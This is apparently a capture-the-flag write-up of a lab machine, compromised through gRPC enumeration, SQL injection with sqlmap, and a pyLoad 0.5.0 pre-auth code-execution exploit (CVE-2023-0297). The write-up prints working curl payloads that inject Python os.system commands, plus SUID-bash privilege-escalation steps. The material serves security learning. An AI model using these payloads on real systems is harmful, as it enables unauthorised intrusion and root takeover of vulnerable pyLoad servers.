## Enumeration

### nmap scan
```shell
$ nmap -sS pc
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

```

after googling for default and commen services that uses port 50051 we found grpc worth a try. to talk to the server we had to install `grpcurl` from this [repo](https://github.com/fullstorydev/grpcurl).

we can list the available services. we found two.

```shell
$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

to enumerate further lets check the availabe methods.

```shell
$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp

SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

to test each method we used [grpcui](https://github.com/fullstorydev/grpcui)

### grpcui

registration of a new accoun works fine.

![image](/images/Pasted image 20230617221247.png)

even logging in. we recognized that we get a login token to use with other methods.

![image](/images/Pasted image 20230617221217.png)

so, to get info about a specific ID we can use the `getInfo` method.

## sqli

and with the token we get a response. unfortunately no useful information in just calling ids. so we tried some basic sqli and the id-field seemed vulnerable, because not only id `1` gave  result also `1 OR 2`. 

in the next step we used the recorded request in burp to save a request and try it with `sqlmap`

`sqlmap -r reques.req --dump`

```shell
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| Here****************31 | sau      |
+------------------------+----------+

```

and we got credentials. 

using them on the ssh port got us access to the user `sau`

and to our first flag.

## Privesc

after checking the usual stuff we were looking for other services that are running on the system.

```shell
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name

```

netstat gave us the ports that are currently listening. and *port 9666* stands out. googling brought up that i could be `pyload` and a quick search approved our guess.

so, we check the version of pyload. it is `0.5.0`
a short trip to the internet gave us this handy exploit. and it fits our version.

[exploit-link](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)

to run the exploit we needed to use this curl snippet and changed the commands necessary for getting root.

```shell
curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"touch%20tmp/jojop\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://localhost:9666/flash/addcrypted2'
```

our PoC worked. we created a file as root.

then we copied from `/bin/bash` a copy of bash to `/tmp/bash_ex`
after that we added the `suid-bit` with.

`chmod +xs /tmp/bash_ex` (do not forget to url encode your commands)

```shell
curl -i -s -k -X $'POST'     --data-binary $'jk=pyimport%20os;os.system(\"chmod%20%2Bxs%20%2Ftmp%2Fbash_ex\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'     $'http://localhost:9666/flash/addcrypted2'
```

and after that just execute the new binary with `/tmp/bash_ex -p` to preserve privileges.

we are root and got the last flag
